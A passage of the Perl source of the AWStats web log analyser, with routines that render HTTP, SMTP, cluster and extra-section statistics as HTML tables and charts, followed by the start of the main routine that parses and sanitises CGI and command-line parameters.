\"</td>\";\n\t\tif ( $MiscListCalc{$key} eq 'v' ) {\n\t\t\tprint \"<td>\"\n\t\t\t  . Format_Number(( $_misc_h{$key} || 0 ))\n\t\t\t  . \" / \".Format_Number($total).\" $Message[12]</td>\";\n\t\t}\n\t\tif ( $MiscListCalc{$key} eq 'u' ) {\n\t\t\tprint \"<td>\"\n\t\t\t  . Format_Number(( $_misc_h{$key} || 0 ))\n\t\t\t  . \" / \".Format_Number($total).\" $Message[18]</td>\";\n\t\t}\n\t\tif ( $MiscListCalc{$key} eq 'hm' ) { print \"<td>-</td>\"; }\n\t\tprint \"<td>\" . ( $total ? \"$p %\" : \"&nbsp;\" ) . \"</td>\";\n\t\tprint \"</tr>\\n\";\n\t}\n\t&tab_end();\n}\n\n#------------------------------------------------------------------------------\n# Function:     Prints the Status codes chart and table\n# Parameters:   $NewLinkParams, $NewLinkTarget\n# Input:        -\n# Output:       HTML\n# Return:       -\n#------------------------------------------------------------------------------\nsub HTMLMainHTTPStatus{\n\tmy $NewLinkParams = shift;\n\tmy $NewLinkTarget = shift;\n\t\n\tif ($Debug) { debug( \"ShowHTTPErrorsStats\", 2 ); }\n\tprint \"$Center<a name=\\\"errors\\\">&nbsp;</a><br />\\n\";\n\tmy $title = \"$Message[32]\";\n\t\n    if ( $AddLinkToExternalCGIWrapper && ($ENV{'GATEWAY_INTERFACE'} || !$StaticLinks) ) {\n       # extend the title to include the added link\n           $title .= \" &nbsp; - &nbsp; <a href=\\\"\" . (XMLEncode(\n               \"$AddLinkToExternalCGIWrapper\" . \"?section=ERRORS&baseName=$DirData/$PROG\"\n           . \"&month=$MonthRequired&year=$YearRequired&day=$DayRequired\"\n           . \"&siteConfig=$SiteConfig\" )\n           . \"\\\"$NewLinkTarget>$Message[179]</a>\");\n    }\n        \t\n\t&tab_head( \"$title\", 19, 0, 'errors' );\n\t\n\t&BuildKeyList( $MaxRowsInHTMLOutput, 1, \\%_errors_h, \\%_errors_h );\n\t\t\n\t# Graph the top five in a pie chart\n\tif (scalar @keylist > 1){\n\t\tforeach my $pluginname ( keys %{ $PluginsLoaded{'ShowGraph'} } )\n\t\t{\n\t\t\tmy @blocklabel = ();\n\t\t\tmy @valdata = ();\n\t\t\tmy @valcolor = ($color_p);\n\t\t\tmy $cnt = 0;\n\t\t\tforeach my $key (@keylist) {\n\t\t\t\tpush @valdata, int( $_errors_h{$key} / $TotalHitsErrors * 1000 ) / 10;\n\t\t\t\tpush @blocklabel, \"$key\";\n\t\t\t\t$cnt++;\n\t\t\t\tif ($cnt > 4) { last; }\n\t\t\t}\n\t\t\tprint \"<tr><td colspan=\\\"5\\\">\";\n\t\t\tmy $function = \"ShowGraph_$pluginname\";\n\t\t\t&$function(\n\t\t\t\t\"$title\",              \"httpstatus\",\n\t\t\t\t0, \t\t\t\t\t\t\\@blocklabel,\n\t\t\t\t0,           \t\t\t\\@valcolor,\n\t\t\t\t0,              \t\t0,\n\t\t\t\t0,          \t\t\t\\@valdata\n\t\t\t);\n\t\t\tprint \"</td></tr>\";\n\t\t}\n\t}\n\t\n\tprint\n\"<tr bgcolor=\\\"#$color_TableBGRowTitle\\\"><th colspan=\\\"2\\\">$Message[32]*</th><th bgcolor=\\\"#$color_h\\\" width=\\\"80\\\">$Message[57]</th><th bgcolor=\\\"#$color_h\\\" width=\\\"80\\\">$Message[15]</th><th bgcolor=\\\"#$color_k\\\" width=\\\"80\\\">$Message[75]</th></tr>\\n\";\n\tmy $total_h = 0;\n\tmy $count = 0;\n\tforeach my $key (@keylist) {\n\t\tmy $p = int( $_errors_h{$key} / $TotalHitsErrors * 1000 ) / 10;\n\t\tprint \"<tr\" . Tooltip( $key, $key ) . \">\";\n\t\tif ( $TrapInfosForHTTPErrorCodes{$key} ) {\n\t\t\tprint \"<td><a href=\\\"\"\n\t\t\t  . (\n\t\t\t\t$ENV{'GATEWAY_INTERFACE'} || !$StaticLinks\n\t\t\t\t? XMLEncode(\n\t\t\t\t\t\"$AWScript${NewLinkParams}output=errors$key\")\n\t\t\t\t: \"$StaticLinks.errors$key.$StaticExt\"\n\t\t\t  )\n\t\t\t  . \"\\\"$NewLinkTarget>$key</a></td>\";\n\t\t}\n\t\telse { print \"<td valign=\\\"top\\\">$key</td>\"; }\n\t\tprint \"<td class=\\\"aws\\\">\"\n\t\t  . (\n\t\t\t$httpcodelib{$key} ? $httpcodelib{$key} : 'Unknown error' )\n\t\t  . \"</td><td>\".Format_Number($_errors_h{$key}).\"</td><td>$p %</td><td>\"\n\t\t  . Format_Bytes( $_errors_k{$key} ) . \"</td>\";\n\t\tprint \"</tr>\\n\";\n\t\t$total_h += $_errors_h{$key};\n\t\t$count++;\n\t}\n\t&tab_end(\"* $Message[154]\");\n}\n\n#------------------------------------------------------------------------------\n# Function:     Prints the Status codes chart and table\n# Parameters:   $NewLinkParams, $NewLinkTarget\n# Input:        -\n# Output:       HTML\n# Return:       -\n#------------------------------------------------------------------------------\nsub HTMLMainSMTPStatus{\n\tmy $NewLinkParams = shift;\n\tmy $NewLinkTarget = shift;\n\t\n\tif ($Debug) { debug( \"ShowSMTPErrorsStats\", 2 ); }\n\tprint \"$Center<a name=\\\"errors\\\">&nbsp;</a><br />\\n\";\n\tmy $title = \"$Message[147]\";\n\t&tab_head( \"$title\", 19, 0, 'errors' );\n\tprint\n\"<tr bgcolor=\\\"#$color_TableBGRowTitle\\\"><th colspan=\\\"2\\\">$Message[147]</th><th bgcolor=\\\"#$color_h\\\" width=\\\"80\\\">$Message[57]</th><th bgcolor=\\\"#$color_h\\\" width=\\\"80\\\">$Message[15]</th><th bgcolor=\\\"#$color_k\\\" width=\\\"80\\\">$Message[75]</th></tr>\\n\";\n\tmy $total_h = 0;\n\tmy $count = 0;\n\t&BuildKeyList( $MaxRowsInHTMLOutput, 1, \\%_errors_h, \\%_errors_h );\n\n\tforeach my $key (@keylist) {\n\t\tmy $p = int( $_errors_h{$key} / $TotalHitsErrors * 1000 ) / 10;\n\t\tprint \"<tr\" . Tooltip( $key, $key ) . \">\";\n\t\tprint \"<td valign=\\\"top\\\">$key</td>\";\n\t\tprint \"<td class=\\\"aws\\\">\"\n\t\t  . (\n\t\t\t$smtpcodelib{$key} ? $smtpcodelib{$key} : 'Unknown error' )\n\t\t  . \"</td><td>\".Format_Number($_errors_h{$key}).\"</td><td>$p %</td><td>\"\n\t\t  . Format_Bytes( $_errors_k{$key} ) . \"</td>\";\n\t\tprint \"</tr>\\n\";\n\t\t$total_h += $_errors_h{$key};\n\t\t$count++;\n\t}\n\t&tab_end();\n}\n\n#------------------------------------------------------------------------------\n# Function:     Prints the cluster information chart and table\n# Parameters:   $NewLinkParams, $NewLinkTarget\n# Input:        -\n# Output:       HTML\n# Return:       -\n#------------------------------------------------------------------------------\nsub HTMLMainCluster{\n\tmy $NewLinkParams = shift;\n\tmy $NewLinkTarget = shift;\n\t\n\tif ($Debug) { debug( \"ShowClusterStats\", 2 ); }\n\tprint \"$Center<a name=\\\"clusters\\\">&nbsp;</a><br />\\n\";\n\tmy $title = \"$Message[155]\";\n\t\n    if ( $AddLinkToExternalCGIWrapper && ($ENV{'GATEWAY_INTERFACE'} || !$StaticLinks) ) {\n       # extend the title to include the added link\n           $title .= \" &nbsp; - &nbsp; <a href=\\\"\" . (XMLEncode(\n               \"$AddLinkToExternalCGIWrapper\" . \"?section=CLUSTER&baseName=$DirData/$PROG\"\n           . \"&month=$MonthRequired&year=$YearRequired&day=$DayRequired\"\n           . \"&siteConfig=$SiteConfig\" )\n           . \"\\\"$NewLinkTarget>$Message[179]</a>\");\n    }\n        \t\n\t&tab_head( \"$title\", 19, 0, 'clusters' );\n\t\n\t&BuildKeyList( $MaxRowsInHTMLOutput, 1, \\%_cluster_p, \\%_cluster_p );\n\t\n\t# Graph the top five in a pie chart\n\tif (scalar @keylist > 1){\n\t\tforeach my $pluginname ( keys %{ $PluginsLoaded{'ShowGraph'} } )\n\t\t{\n\t\t\tmy @blocklabel = ();\n\t\t\tmy @valdata = ();\n\t\t\tmy @valcolor = ($color_p);\n\t\t\tmy $cnt = 0;\n\t\t\tforeach my $key (@keylist) {\n\t\t\t\tpush @valdata, int( $_cluster_p{$key} / $TotalHits * 1000 ) / 10;\n\t\t\t\tpush @blocklabel, \"$key\";\n\t\t\t\t$cnt++;\n\t\t\t\tif ($cnt > 4) { last; }\n\t\t\t}\n\t\t\tprint \"<tr><td colspan=\\\"7\\\">\";\n\t\t\tmy $function = \"ShowGraph_$pluginname\";\n\t\t\t&$function(\n\t\t\t\t\"$title\",              \"cluster\",\n\t\t\t\t0, \t\t\t\t\t\t\\@blocklabel,\n\t\t\t\t0,           \t\t\t\\@valcolor,\n\t\t\t\t0,              \t\t0,\n\t\t\t\t0,          \t\t\t\\@valdata\n\t\t\t);\n\t\t\tprint \"</td></tr>\";\n\t\t}\n\t}\n\t\n\tprint\n\t  \"<tr bgcolor=\\\"#$color_TableBGRowTitle\\\"><th>$Message[155]</th>\";\n\t&HTMLShowClusterInfo('__title__');\n\tif ( $ShowClusterStats =~ /P/i ) {\n\t\tprint\n\"<th bgcolor=\\\"#$color_p\\\" width=\\\"80\\\">$Message[56]</th><th bgcolor=\\\"#$color_p\\\" width=\\\"80\\\">$Message[15]</th>\";\n\t}\n\tif ( $ShowClusterStats =~ /H/i ) {\n\t\tprint\n\"<th bgcolor=\\\"#$color_h\\\" width=\\\"80\\\">$Message[57]</th><th bgcolor=\\\"#$color_h\\\" width=\\\"80\\\">$Message[15]</th>\";\n\t}\n\tif ( $ShowClusterStats =~ /B/i ) {\n\t\tprint\n\"<th bgcolor=\\\"#$color_k\\\" width=\\\"80\\\">$Message[75]</th><th bgcolor=\\\"#$color_k\\\" width=\\\"80\\\">$Message[15]</th>\";\n\t}\n\tprint \"</tr>\\n\";\n\tmy $total_p = my $total_h = my $total_k = 0;\n\n# Cluster feature might have been enable in middle of month so we recalculate\n# total for cluster section only, to calculate ratio, instead of using global total\n\tforeach my $key (@keylist) {\n\t\t$total_p += int( $_cluster_p{$key} || 0 );\n\t\t$total_h += int( $_cluster_h{$key} || 0 );\n\t\t$total_k += int( $_cluster_k{$key} || 0 );\n\t}\n\tmy $count = 0;\n\tforeach my $key (@keylist) {\n\t\tmy $p_p = int( $_cluster_p{$key} / $total_p * 1000 ) / 10;\n\t\tmy $p_h = int( $_cluster_h{$key} / $total_h * 1000 ) / 10;\n\t\tmy $p_k = int( $_cluster_k{$key} / $total_k * 1000 ) / 10;\n\t\tprint \"<tr>\";\n\t\tprint \"<td class=\\\"aws\\\">Computer $key</td>\";\n\t\t&HTMLShowClusterInfo($key);\n\t\tif ( $ShowClusterStats =~ /P/i ) {\n\t\t\tprint \"<td>\"\n\t\t\t  . ( $_cluster_p{$key} ? Format_Number($_cluster_p{$key}) : \"&nbsp;\" )\n\t\t\t  . \"</td><td>$p_p %</td>\";\n\t\t}\n\t\tif ( $ShowClusterStats =~ /H/i ) {\n\t\t\tprint \"<td>\".Format_Number($_cluster_h{$key}).\"</td><td>$p_h %</td>\";\n\t\t}\n\t\tif ( $ShowClusterStats =~ /B/i ) {\n\t\t\tprint \"<td>\"\n\t\t\t  . Format_Bytes( $_cluster_k{$key} )\n\t\t\t  . \"</td><td>$p_k %</td>\";\n\t\t}\n\t\tprint \"</tr>\\n\";\n\t\t$count++;\n\t}\n\t&tab_end();\n}\n\n#------------------------------------------------------------------------------\n# Function:     Prints a chart or table for each extra section\n# Parameters:   $NewLinkParams, $NewLinkTarget, $extranum\n# Input:        -\n# Output:       HTML\n# Return:       -\n#------------------------------------------------------------------------------\nsub HTMLMainExtra{\n\tmy $NewLinkParams = shift;\n\tmy $NewLinkTarget = shift;\n\tmy $extranum = shift;\n\t\n\tif ($Debug) { debug( \"ExtraName$extranum\", 2 ); }\n\tprint \"$Center<a name=\\\"extra$extranum\\\">&nbsp;</a><br />\";\n\tmy $title = $ExtraName[$extranum];\n\t&tab_head( \"$title\", 19, 0, \"extra$extranum\" );\n\tprint \"<tr bgcolor=\\\"#$color_TableBGRowTitle\\\">\";\n\tprint \"<th>\" . $ExtraFirstColumnTitle[$extranum];\n\tprint \"&nbsp; - &nbsp; <a href=\\\"\"\n\t  . (\n\t\t$ENV{'GATEWAY_INTERFACE'} || !$StaticLinks\n\t\t? XMLEncode(\n\t\t\t\"$AWScript${NewLinkParams}output=allextra$extranum\")\n\t\t: \"$StaticLinks.allextra$extranum.$StaticExt\"\n\t  )\n\t  . \"\\\"$NewLinkTarget>$Message[80]</a>\";\n\t  \n    if ( $AddLinkToExternalCGIWrapper && ($ENV{'GATEWAY_INTERFACE'} || !$StaticLinks) ) {\n        print \"&nbsp; - &nbsp; <a href=\\\"\"\n          . (XMLEncode(\n               \"$AddLinkToExternalCGIWrapper\" . \"?section=EXTRA_$extranum&baseName=$DirData/$PROG\"\n            . \"&month=$MonthRequired&year=$YearRequired&day=$DayRequired\"\n            . \"&sectionTitle=$ExtraName[$extranum]&siteConfig=$SiteConfig\" )\n            . \"\\\"$NewLinkTarget>$Message[179]</a>\");\n    }\n  \n\tprint \"</th>\";\n\n\tif ( $ExtraStatTypes[$extranum] =~ m/P/i ) {\n\t\tprint\n\t\t  \"<th bgcolor=\\\"#$color_p\\\" width=\\\"80\\\">$Message[56]</th>\";\n\t}\n\tif ( $ExtraStatTypes[$extranum] =~ m/H/i ) {\n\t\tprint\n\t\t  \"<th bgcolor=\\\"#$color_h\\\" width=\\\"80\\\">$Message[57]</th>\";\n\t}\n\tif ( $ExtraStatTypes[$extranum] =~ m/B/i ) {\n\t\tprint\n\t\t  \"<th bgcolor=\\\"#$color_k\\\" width=\\\"80\\\">$Message[75]</th>\";\n\t}\n\tif ( $ExtraStatTypes[$extranum] =~ m/L/i ) {\n\t\tprint \"<th width=\\\"120\\\">$Message[9]</th>\";\n\t}\n\tprint \"</tr>\\n\";\n\tmy $total_p = my $total_h = my $total_k = 0;\n\n\t #$max_h=1; foreach (values %_login_h) { if ($_ > $max_h) { $max_h = $_; } }\n\t #$max_k=1; foreach (values %_login_k) { if ($_ > $max_k) { $max_k = $_; } }\n\tmy $count = 0;\n\tif ( $MaxNbOfExtra[$extranum] ) {\n\t\tif ( $ExtraStatTypes[$extranum] =~ m/P/i ) {\n\t\t\t&BuildKeyList(\n\t\t\t\t$MaxNbOfExtra[$extranum],\n\t\t\t\t$MinHitExtra[$extranum],\n\t\t\t\t\\%{ '_section_' . $extranum . '_h' },\n\t\t\t\t\\%{ '_section_' . $extranum . '_p' }\n\t\t\t);\n\t\t}\n\t\telse {\n\t\t\t&BuildKeyList(\n\t\t\t\t$MaxNbOfExtra[$extranum],\n\t\t\t\t$MinHitExtra[$extranum],\n\t\t\t\t\\%{ '_section_' . $extranum . '_h' },\n\t\t\t\t\\%{ '_section_' . $extranum . '_h' }\n\t\t\t);\n\t\t}\n\t}\n\telse {\n\t\t@keylist = ();\n\t}\n\tmy %keysinkeylist = ();\n\tforeach my $key (@keylist) {\n\t\t$keysinkeylist{$key} = 1;\n\t\tmy $firstcol = CleanXSS( DecodeEncodedString($key) );\n\t\t$total_p += ${ '_section_' . $extranum . '_p' }{$key};\n\t\t$total_h += ${ '_section_' . $extranum . '_h' }{$key};\n\t\t$total_k += ${ '_section_' . $extranum . '_k' }{$key};\n\t\tprint \"<tr>\";\n\t\tprintf(\n\t\t\t\"<td class=\\\"aws\\\">$ExtraFirstColumnFormat[$extranum]</td>\",\n\t\t\t$firstcol, $firstcol, $firstcol, $firstcol, $firstcol );\n\t\tif ( $ExtraStatTypes[$extranum] =~ m/P/i ) {\n\t\t\tprint \"<td>\"\n\t\t\t  . ${ '_section_' . $extranum . '_p' }{$key} . \"</td>\";\n\t\t}\n\t\tif ( $ExtraStatTypes[$extranum] =~ m/H/i ) {\n\t\t\tprint \"<td>\"\n\t\t\t  . ${ '_section_' . $extranum . '_h' }{$key} . \"</td>\";\n\t\t}\n\t\tif ( $ExtraStatTypes[$extranum] =~ m/B/i ) {\n\t\t\tprint \"<td>\"\n\t\t\t  . Format_Bytes(\n\t\t\t\t${ '_section_' . $extranum . '_k' }{$key} )\n\t\t\t  . \"</td>\";\n\t\t}\n\t\tif ( $ExtraStatTypes[$extranum] =~ m/L/i ) {\n\t\t\tprint \"<td>\"\n\t\t\t  . (\n\t\t\t\t${ '_section_' . $extranum . '_l' }{$key}\n\t\t\t\t? Format_Date(\n\t\t\t\t\t${ '_section_' . $extranum . '_l' }{$key}, 1 )\n\t\t\t\t: '-'\n\t\t\t  )\n\t\t\t  . \"</td>\";\n\t\t}\n\t\tprint \"</tr>\\n\";\n\t\t$count++;\n\t}\n\n\t# If we ask average or sum, we loop on all other records\n\tif ( $ExtraAddAverageRow[$extranum] || $ExtraAddSumRow[$extranum] )\n\t{\n\t\tforeach ( keys %{ '_section_' . $extranum . '_h' } ) {\n\t\t\tif ( $keysinkeylist{$_} ) { next; }\n\t\t\t$total_p += ${ '_section_' . $extranum . '_p' }{$_};\n\t\t\t$total_h += ${ '_section_' . $extranum . '_h' }{$_};\n\t\t\t$total_k += ${ '_section_' . $extranum . '_k' }{$_};\n\t\t\t$count++;\n\t\t}\n\t}\n\n\t# Add average row\n\tif ( $ExtraAddAverageRow[$extranum] ) {\n\t\tprint \"<tr>\";\n\t\tprint \"<td class=\\\"aws\\\"><b>$Message[96]</b></td>\";\n\t\tif ( $ExtraStatTypes[$extranum] =~ m/P/i ) {\n\t\t\tprint \"<td>\"\n\t\t\t  . ( $count ? Format_Number(( $total_p / $count )) : \"&nbsp;\" ) . \"</td>\";\n\t\t}\n\t\tif ( $ExtraStatTypes[$extranum] =~ m/H/i ) {\n\t\t\tprint \"<td>\"\n\t\t\t  . ( $count ? Format_Number(( $total_h / $count )) : \"&nbsp;\" ) . \"</td>\";\n\t\t}\n\t\tif ( $ExtraStatTypes[$extranum] =~ m/B/i ) {\n\t\t\tprint \"<td>\"\n\t\t\t  . (\n\t\t\t\t$count ? Format_Bytes( $total_k / $count ) : \"&nbsp;\" )\n\t\t\t  . \"</td>\";\n\t\t}\n\t\tif ( $ExtraStatTypes[$extranum] =~ m/L/i ) {\n\t\t\tprint \"<td>&nbsp;</td>\";\n\t\t}\n\t\tprint \"</tr>\\n\";\n\t}\n\n\t# Add sum row\n\tif ( $ExtraAddSumRow[$extranum] ) {\n\t\tprint \"<tr>\";\n\t\tprint \"<td class=\\\"aws\\\"><b>$Message[102]</b></td>\";\n\t\tif ( $ExtraStatTypes[$extranum] =~ m/P/i ) {\n\t\t\tprint \"<td>\" . Format_Number(($total_p)) . \"</td>\";\n\t\t}\n\t\tif ( $ExtraStatTypes[$extranum] =~ m/H/i ) {\n\t\t\tprint \"<td>\" . Format_Number(($total_h)) . \"</td>\";\n\t\t}\n\t\tif ( $ExtraStatTypes[$extranum] =~ m/B/i ) {\n\t\t\tprint \"<td>\" . Format_Bytes($total_k) . \"</td>\";\n\t\t}\n\t\tif ( $ExtraStatTypes[$extranum] =~ m/L/i ) {\n\t\t\tprint \"<td>&nbsp;</td>\";\n\t\t}\n\t\tprint \"</tr>\\n\";\n\t}\n\t&tab_end();\n}\n\n#------------------------------------------------------------------------------\n# MAIN\n#------------------------------------------------------------------------------\n( $DIR  = $0 ) =~ s/([^\\/\\\\]+)$//;\n( $PROG = $1 ) =~ s/\\.([^\\.]*)$//;\n$Extension = $1;\n$DIR ||= '.';\n$DIR =~ s/([^\\/\\\\])[\\\\\\/]+$/$1/;\n\n$starttime = time();\n\n# Get current time (time when AWStats was started)\n( $nowsec, $nowmin, $nowhour, $nowday, $nowmonth, $nowyear, $nowwday, $nowyday )\n  = localtime($starttime);\n$nowweekofmonth = int( $nowday / 7 );\n$nowweekofyear  =\n  int( ( $nowyday - 1 + 6 - ( $nowwday == 0 ? 6 : $nowwday - 1 ) ) / 7 ) + 1;\nif ( $nowweekofyear > 52 ) { $nowweekofyear = 1; }\n$nowdaymod = $nowday % 7;\n$nowwday++;\n$nowns = Time::Local::timegm( 0, 0, 0, $nowday, $nowmonth, $nowyear );\n\nif ( $nowdaymod <= $nowwday ) {\n\tif ( ( $nowwday != 7 ) || ( $nowdaymod != 0 ) ) {\n\t\t$nowweekofmonth = $nowweekofmonth + 1;\n\t}\n}\nif ( $nowdaymod > $nowwday ) { $nowweekofmonth = $nowweekofmonth + 2; }\n\n# Change format of time variables\n$nowweekofmonth = \"0$nowweekofmonth\";\nif ( $nowweekofyear < 10 ) { $nowweekofyear = \"0$nowweekofyear\"; }\nif ( $nowyear < 100 ) { $nowyear += 2000; }\nelse { $nowyear += 1900; }\n$nowsmallyear = $nowyear;\n$nowsmallyear =~ s/^..//;\nif ( ++$nowmonth < 10 ) { $nowmonth = \"0$nowmonth\"; }\nif ( $nowday < 10 )     { $nowday   = \"0$nowday\"; }\nif ( $nowhour < 10 )    { $nowhour  = \"0$nowhour\"; }\nif ( $nowmin < 10 )     { $nowmin   = \"0$nowmin\"; }\nif ( $nowsec < 10 )     { $nowsec   = \"0$nowsec\"; }\n$nowtime = int( $nowyear . $nowmonth . $nowday . $nowhour . $nowmin . $nowsec );\n\n# Get tomorrow time (will be used to discard some record with corrupted date (future date))\nmy (\n\t$tomorrowsec, $tomorrowmin,   $tomorrowhour,\n\t$tomorrowday, $tomorrowmonth, $tomorrowyear\n  )\n  = localtime( $starttime + 86400 );\nif ( $tomorrowyear < 100 ) { $tomorrowyear += 2000; }\nelse { $tomorrowyear += 1900; }\nif ( ++$tomorrowmonth < 10 ) { $tomorrowmonth = \"0$tomorrowmonth\"; }\nif ( $tomorrowday < 10 )     { $tomorrowday   = \"0$tomorrowday\"; }\nif ( $tomorrowhour < 10 )    { $tomorrowhour  = \"0$tomorrowhour\"; }\nif ( $tomorrowmin < 10 )     { $tomorrowmin   = \"0$tomorrowmin\"; }\nif ( $tomorrowsec < 10 )     { $tomorrowsec   = \"0$tomorrowsec\"; }\n$tomorrowtime =\n  int(  $tomorrowyear\n\t  . $tomorrowmonth\n\t  . $tomorrowday\n\t  . $tomorrowhour\n\t  . $tomorrowmin\n\t  . $tomorrowsec );\n\n# Allowed option\nmy @AllowedCLIArgs = (\n\t'migrate',            'config',\n\t'logfile',            'output',\n\t'runascli',           'update',\n\t'staticlinks',        'staticlinksext',\n\t'noloadplugin',       'loadplugin',\n\t'hostfilter',         'urlfilter',\n\t'refererpagesfilter', 'lang',\n\t'month',              'year',\n\t'framename',          'debug',\n\t'showsteps',          'showdropped',\n\t'showcorrupted',      'showunknownorigin',\n\t'showdirectorigin',   'limitflush',\n    'nboflastupdatelookuptosave',\n\t'confdir',            'updatefor',\n\t'hostfilter',         'hostfilterex',\n\t'urlfilter',          'urlfilterex',\n\t'refererpagesfilter', 'refererpagesfilterex',\n\t'pluginmode',         'filterrawlog'\n);\n\n# Parse input parameters and sanitize them for security reasons\n$QueryString = '';\n\n# AWStats use GATEWAY_INTERFACE to known if ran as CLI or CGI. AWSTATS_DEL_GATEWAY_INTERFACE can\n# be set to force AWStats to be ran as CLI even from a web page.\nif ( $ENV{'AWSTATS_DEL_GATEWAY_INTERFACE'} ) { $ENV{'GATEWAY_INTERFACE'} = ''; }\nif ( $ENV{'GATEWAY_INTERFACE'} ) {    # Run from a browser as CGI\n\t$DebugMessages = 0;\n\n\t# Prepare QueryString\n\tif ( $ENV{'CONTENT_LENGTH'} ) {\n\t\tbinmode STDIN;\n\t\tread( STDIN, $QueryString, $ENV{'CONTENT_LENGTH'} );\n\t}\n\tif ( $ENV{'QUERY_STRING'} ) {\n\t\t$QueryString = $ENV{'QUERY_STRING'};\n\n\t\t# Set & and &amp; to &amp;\n\t\t$QueryString =~ s/&amp;/&/g;\n\t\t$QueryString =~ s/&/&amp;/g;\n\t}\n\n\t# Remove all XSS vulnerabilities coming from AWStats parameters\n\t$QueryString = CleanXSS( &DecodeEncodedString($QueryString) );\n\n\t# Security test\n\tif ( $QueryString =~ /LogFile=([^&]+)/i ) {\n\t\terror(\n\"Logfile parameter can't be overwritten when AWStats is used from a CGI\"\n\t\t);\n\t}\n\n\t# No update but report by default when run from a browser\n\t$UpdateStats = ( $QueryString =~ /update=1/i ? 1 : 0 );\n\n\tif ( $QueryString =~ /config=([^&]+)/i ) { \n\t\t$SiteConfig = &Sanitize(\"$1\");\n\t}\n\tif ( $QueryString =~ /diricons=([^&]+)/i ) { $DirIcons = \"$1\"; }\n\tif ( $QueryString =~ /pluginmode=([^&]+)/i ) {\n\t\t$PluginMode = &Sanitize( \"$1\", 1 );\n\t}\n\tif ( $QueryString =~ /configdir=([^&]+)/i ) {\n\t\t$DirConfig = &Sanitize(\"$1\");\n\t\t$DirConfig =~ s/\\\\{2,}/\\\\/g;\t# This is to clean Remote URL\n\t\t$DirConfig =~ s/\\/{2,}/\\//g;\t# This is to clean Remote URL\n\t}\n\n\t# All filters\n\tif ( $QueryString =~ /hostfilter=([^&]+)/i ) {\n\t\t$FilterIn{'host'} = \"$1\";\n\t}    # Filter on host list can also be defined with hostfilter=filter\n\tif ( $QueryString =~ /hostfilterex=([^&]+)/i ) {\n\t\t$FilterEx{'host'} = \"$1\";\n\t}    #\n\tif ( $QueryString =~ /urlfilter=([^&]+)/i ) {\n\t\t$FilterIn{'url'} = \"$1\";\n\t}    # Filter on URL list can also be defined with urlfilter=filter\n\tif ( $QueryString =~ /urlfilterex=([^&]+)/i ) { $FilterEx{'url'} = \"$1\"; } #\n\tif ( $QueryString =~ /refererpagesfilter=([^&]+)/i ) {\n\t\t$FilterIn{'refererpages'} = \"$1\";\n\t} # Filter on referer list can also be defined with refererpagesfilter=filter\n\tif ( $QueryString =~ /refererpagesfilterex=([^&]+)/i ) {\n\t\t$FilterEx{'refererpages'} = \"$1\";\n\t}    #\n\t     # All output\n\tif ( $QueryString =~ /output=allhosts:([^&]+)/i ) {\n\t\t$FilterIn{'host'} = \"$1\";\n\t} # Filter on host list can be defined with output=allhosts:filter to reduce number of lines read and showed\n\tif ( $QueryString =~ /output=lasthosts:([^&]+)/i ) {\n\t\t$FilterIn{'host'} = \"$1\";\n\t} # Filter on host list can be defined with output=lasthosts:filter to reduce number of lines read and showed\n\tif ( $QueryString =~ /output=urldetail:([^&]+)/i ) {\n\t\t$FilterIn{'url'} = \"$1\";\n\t} # Filter on URL list can be defined with output=urldetail:filter to reduce number of lines read and showed\n\tif ( $QueryString =~ /output=refererpages:([^&]+)/i ) {\n\t\t$FilterIn{'refererpages'} = \"$1\";\n\t} # Filter on referer list can be defined with output=refererpages:filter to reduce number of lines read and showed\n\n\t# If migrate\n\tif ( $QueryString =~ /(^|-|&|&amp;)migrate=([^&]+)/i ) {\n\t\t$MigrateStats = &Sanitize(\"$2\");\n\n\t\t$MigrateStats =~ /^(.*)$PROG(\\d{0,2})(\\d\\d)(\\d\\d\\d\\d)(.*)\\.txt$/;\n\t\t$SiteConfig = &Sanitize($5 ? $5 : 'xxx');\n\t\t$SiteConfig =~ s/^\\.//;    # SiteConfig is used to find config file\n\t}\n\n\t$SiteConfig =~ s/\\.\\.//g; \t\t# Avoid directory transversal\n}\nelse {                             # Run from command line\n\t$DebugMessages = 1;\n\n\t# Prepare QueryString\n\tfor ( 0 .. @ARGV - 1 ) {\n\n\t\t# If migrate\n\t\tif ( $ARGV[$_] =~ /(^|-|&|&amp;)migrate=([^&]+)/i ) {\n\t\t\t$MigrateStats = &Sanitize(\"$2\");\n\n\t\t\t$MigrateStats =~ /^(.*)$PROG(\\d{0,2})(\\d\\d)(\\d\\d\\d\\d)(.*)\\.txt$/;\n\t\t\t$SiteConfig = &Sanitize($5 ? $5 : 'xxx');\n\t\t\t$SiteConfig =~ s/^\\.//;    # SiteConfig is used to find config file\n\t\t\tnext;\n\t\t}\n\n\t\t# TODO Check if ARGV is in @AllowedArg\n\t\tif ($QueryString) { $QueryString .= '&amp;'; }\n\t\tmy $NewLinkParams = $ARGV[$_];\n\t\t$NewLinkParams =~ s/^-+//;\n\t\t$QueryString .= \"$NewLinkParams\";\n\t}\n\n\t# Remove all XSS vulnerabilities coming from AWStats parameters\n\t$QueryString = CleanXSS($QueryString);\n\n\t# Security test\n\tif (   $ENV{'AWSTATS_DEL_GATEWAY_INTERFACE'}\n\t\t&& $QueryString =~ /LogFile=([^&]+)/i )\n\t{\n\t\terror(\n\"Logfile parameter can't be overwritten when AWStats is used from a CGI\"\n\t\t);\n\t}\n\n\t# Update with no report by default when run from command line\n\t$UpdateStats = 1;\n\n\tif ( $QueryString =~ /config=([^&]+)/i ) { \n\t\t$SiteConfig = &Sanitize(\"$1\"); \n\t}\n\tif ( $QueryString =~ /diricons=([^&]+)/i ) { $DirIcons = \"$1\"; }\n\tif ( $QueryString =~ /pluginmode=([^&]+)/i ) {\n\t\t$PluginMode = &Sanitize( \"$1\", 1 );\n\t}\n\tif ( $QueryString =~ /configdir=([^&]+)/i ) {\n\t\t$DirConfig = &Sanitize(\"$1\");\n\t\t$DirConfig =~ s/\\\\{2,}/\\\\/g;\t# This is to clean Remote URL\n\t\t$DirConfig =~ s/\\/{2,}/\\//g;\t# This is to clean Remote URL\n\t}\n\n\t# All filters\n\tif ( $QueryString =~ /hostfilter=([^&]+)/i ) {\n\t\t$FilterIn{'host'} = \"$1\";\n\t}    # Filter on host list can also be defined with hostfilter=filter\n\tif ( $QueryString =~ /hostfilterex=([^&]+)/i ) {\n\t\t$FilterEx{'host'} = \"$1\";\n\t}    #\n\tif ( $QueryString =~ /urlfilter=([^&]+)/i ) {\n\t\t$FilterIn{'url'} = \"$1\";\n\t}    # Filter on URL list can also be defined with urlfilter=filter\n\tif ( $QueryString =~ /urlfilterex=([^&]+)/i ) { $FilterEx{'url'} = \"$1\"; } #\n\tif ( $QueryString =~ /refererpagesfilter=([^&]+)/i ) 